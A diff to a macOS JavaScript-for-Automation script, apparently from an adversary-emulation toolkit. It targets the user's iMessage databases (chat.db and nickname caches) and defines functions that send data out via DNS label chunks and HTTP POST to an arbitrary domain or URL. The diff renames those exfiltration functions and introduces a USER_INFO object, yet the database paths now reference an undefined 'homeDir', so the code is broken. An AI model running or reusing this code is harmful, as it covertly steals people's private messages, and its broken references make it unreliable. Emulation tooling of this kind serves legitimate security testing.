@@ -23,15 +23,18 @@ const LOG_DIR = "../../logs";
 const LOG_FILE_NAME = `${TTP_ID.COLLECTION_DATA_FROM_LOCAL_SYSTEM}_${SCRIPT_NAME}.log`;
 let LOG_ENABLED = false;
 
-// Get the current user's home directory
-const homeDirectory = $.NSHomeDirectory().js;
+// Get user information
+const USER_INFO = {
+    username: $.NSUserName().js,
+    homeDir: $.NSHomeDirectory().js
+};
 
 // Database paths
 const DB_PATHS = {
-    messages: `${homeDirectory}/Library/Messages/chat.db`,
-    nicknames: `${homeDirectory}/Library/Messages/NickNameCache/nickNameKeyStore.db`,
-    handleSharing: `${homeDirectory}/Library/Messages/NickNameCache/handleSharingPreferences.db`,
-    collaborationNotices: `${homeDirectory}/Library/Messages/CollaborationNoticeCache/collaborationNotices.db`
+    messages: `${homeDir}/Library/Messages/chat.db`,
+    nicknames: `${homeDir}/Library/Messages/NickNameCache/nickNameKeyStore.db`,
+    handleSharing: `${homeDir}/Library/Messages/NickNameCache/handleSharingPreferences.db`,
+    collaborationNotices: `${homeDir}/Library/Messages/CollaborationNoticeCache/collaborationNotices.db`
 };
 
 // Command paths
@@ -98,7 +101,7 @@ const net = require('net');
 const dns = require('dns');
 const https = require('https');
 
-function exfiltrateViaDNS(data, domain) {
+function exfilViaDNS(data, domain) {
     debug(`Exfiltrating data via DNS to ${domain}`);
     const chunks = chunkData(data, 63);  // DNS labels are limited to 63 characters
     chunks.forEach((chunk, index) => {
@@ -107,7 +110,7 @@ function exfiltrateViaDNS(data, domain) {
     });
 }
 
-function exfiltrateViaHTTP(data, url) {
+function exfilViaHTTP(data, url) {
     debug(`Exfiltrating data via HTTP to ${url}`);
     const request = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
     request.setHTTPMethod('POST');
@@ -143,6 +146,6 @@ module.exports = {
     debug,
     log,
     runSQLQuery,
-    exfiltrateViaDNS,
-    exfiltrateViaHTTP
+    exfilViaDNS,
+    exfilViaHTTP
 };
